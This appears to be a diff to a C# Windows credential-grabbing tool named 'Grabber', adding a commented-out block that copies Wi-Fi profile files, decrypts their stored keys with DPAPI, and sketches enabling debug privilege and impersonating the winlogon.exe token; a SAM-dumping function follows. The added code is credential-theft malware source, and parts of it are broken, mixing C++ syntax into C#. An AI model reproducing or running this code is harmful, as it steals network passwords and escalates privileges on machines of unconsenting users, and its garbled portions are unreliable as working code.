@@ -229,6 +229,170 @@ namespace Grabber
             else return false;
         }
 
+
+        /* WiFi
+        static void grabWifiPasswords(string cd)
+        {
+            string WiFiDirectory = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%") + @"\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\";
+            string outPutDirectory = cd + "\\WiFi\\";
+            Directory.CreateDirectory(outPutDirectory);
+
+            foreach (string dir in Directory.GetDirectories(WiFiDirectory))
+            {
+                foreach (string file in Directory.GetFiles(dir))
+                {
+                    string[] comps = file.Split('\\');
+                    string outFile = outPutDirectory + comps[comps.Length - 1];
+                    File.Copy(file, outFile, true);
+                    XmlDocument doc = new XmlDocument();
+                    doc.Load(outFile);
+
+                    XmlNode protectedNode = doc["WLANProfile"]["MSM"]["security"]["sharedKey"]["protected"];
+                    protectedNode.InnerText = "false";
+
+                    XmlNode password = doc["WLANProfile"]["MSM"]["security"]["sharedKey"]["keyMaterial"];
+                    byte[] encryptedBytes = stringToByteArray(password.InnerText);
+                    byte[] decryptedBytes = new byte[0];
+                    try
+                    {
+                        decryptedBytes = DPAPI.decryptBytes(encryptedBytes);
+                    }
+
+                    catch
+                    {
+                        Console.WriteLine("WiFi decryption failed");
+                    }
+                    password.InnerText = decryptedBytes.ToString();
+                    Console.WriteLine(decryptedBytes.ToString());
+                    doc.Save(outFile);
+                }
+            }
+        }
+
+        static byte[] stringToByteArray(String hex)
+        {
+            int numCharacters = hex.Length / 2;
+            byte[] bytes = new byte[numCharacters];
+            using (var sr = new StringReader(hex))
+            {
+                for (int i = 0; i < numCharacters; i++)
+                    bytes[i] = Convert.ToByte(new string(new char[2] { (char)sr.Read(), (char)sr.Read() }), 16);
+            }
+
+            return bytes;
+        }
+
+        struct LUID
+        {
+            UInt32 LowPart;
+            long HighPart;
+        }
+
+        enum TOKEN_INFORMATION_CLASS { 
+          TokenUser                             = 1,
+          TokenGroups,
+          TokenPrivileges,
+          TokenOwner,
+          TokenPrimaryGroup,
+          TokenDefaultDacl,
+          TokenSource,
+          TokenType,
+          TokenImpersonationLevel,
+          TokenStatistics,
+          TokenRestrictedSids,
+          TokenSessionId,
+          TokenGroupsAndPrivileges,
+          TokenSessionReference,
+          TokenSandBoxInert,
+          TokenAuditPolicy,
+          TokenOrigin,
+          TokenElevationType,
+          TokenLinkedToken,
+          TokenElevation,
+          TokenHasRestrictions,
+          TokenAccessInformation,
+          TokenVirtualizationAllowed,
+          TokenVirtualizationEnabled,
+          TokenIntegrityLevel,
+          TokenUIAccess,
+          TokenMandatoryPolicy,
+          TokenLogonSid,
+          TokenIsAppContainer,
+          TokenCapabilities,
+          TokenAppContainerSid,
+          TokenAppContainerNumber,
+          TokenUserClaimAttributes,
+          TokenDeviceClaimAttributes,
+          TokenRestrictedUserClaimAttributes,
+          TokenRestrictedDeviceClaimAttributes,
+          TokenDeviceGroups,
+          TokenRestrictedDeviceGroups,
+          TokenSecurityAttributes,
+          TokenIsRestricted,
+          MaxTokenInfoClass
+        }
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool GetTokenInformation(
+            IntPtr TokenHandle,
+            TOKEN_INFORMATION_CLASS TokenInformationClass,
+            IntPtr TokenInformation,
+            uint TokenInformationLength,
+            out uint ReturnLength);
+
+
+        bool SetPrivilege (string strPrivilege, IntPtr hToken, bool bEnable)
+        {
+            bool bReturn = false;
+            LUID luid;
+            GetTokenInformation
+            bReturn =  LookupPrivilegeValue (NULL, strPrivilege.c_str(), &luid); // This is the val
+            if (bReturn == false) return false;
+
+            TOKEN_PRIVILEGES tp;
+            tp.PrivilegeCount = 1;
+            tp.Privileges[0].Luid = luid;
+            tp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
+
+            if (AdjustTokenPrivileges (hToken, FALSE, &tp, 0, NULL, NULL) != ERROR_SUCCESS)
+            {
+                return false;
+            }
+            return true;
+        } 
+
+        bool ImpersonateToLoginUser()
+        {
+             IntPtr hProcess;
+             HANDLE hToken;
+             BOOL bSuccess;
+
+            DWORD dwProcID = GetProcessID (L"winlogon.exe");
+
+            if (dwProcID < 1) return false;
+
+            hProcess = OpenProcess (MAXIMUM_ALLOWED, FALSE, dwProcID);
+
+            if (hProcess == INVALID_HANDLE_VALUE)
+                return false;
+            
+            bSuccess = OpenProcessToken (hProcess, MAXIMUM_ALLOWED, &hToken);
+            if (bSuccess)
+            {
+
+                SetPrivilege (SE_DEBUG_NAME, hToken, true); // 
+                 bSuccess = ImpersonateLoggedOnUser (hToken);
+            }
+    
+            if (hProcess)
+            CloseHandle (hProcess);
+            if (hToken)
+            CloseHandle (hToken);
+    
+            return bSuccess;
+        }
+        */
+
         static void dumpSAM(string cd, string home)
         {
             Directory.CreateDirectory(cd + "\\Windows");
